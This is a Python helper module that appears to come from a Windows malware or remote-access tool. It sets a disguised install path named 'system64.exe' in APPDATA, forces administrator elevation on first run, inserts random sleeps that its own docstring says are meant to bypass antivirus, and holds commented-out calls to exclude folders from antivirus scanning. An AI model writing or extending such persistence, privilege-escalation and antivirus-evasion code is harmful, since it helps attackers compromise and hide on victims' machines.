from colorama import init
init()
import os
from colorama import Fore, Style
from elevate import elevate
import random
import time
import subprocess
import tempfile
# from core.features.antivirus import exclude_path_antivirus
from threading import Thread
import sys


# define contstants
APPDATA_EXE = os.getenv("APPDATA") + "\\" + "system64.exe"


def display_msg(msg, color="g"):
    full_msg = "[+] " + msg 
    if color == "g":
        print(Fore.GREEN + full_msg + Style.RESET_ALL)
    elif color == "y":
        print(Fore.YELLOW + full_msg+ Style.RESET_ALL)
    else:
        print(Fore.RED + full_msg + Style.RESET_ALL)
    


def zipdir(path, ziph):
    # ziph is zipfile handle
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))




def elevate_script():
    "MAkes sure that we get admin access for the first time"
    
    if not os.path.exists(APPDATA_EXE):
        elevate()
        time.sleep(generate_random_int())

        # exclude_path_antivirus(tempfile.gettempdir())
        # add_exception()
    else:
        time.sleep(generate_random_int())




def test_for_startup_app():
    """
    Checks if the current executable is the one copied to appdata directory, if it is, 
    add  random delay to execution to bypass AV
    """    
    exe_name = sys.executable
    # display_msg("Current Executable name: "+ exe_name)
    # display_msg("App data exe name: "+ app_data_exe)
    if exe_name == APPDATA_EXE:
        random_dur = generate_random_int()
        time.sleep(random_dur)
        return True
    else:
        # time.sleep(random.randint(1,10))
        return False

def generate_random_int(starting_num=1, ending_num=10):
    return random.randint(starting_num, ending_num)


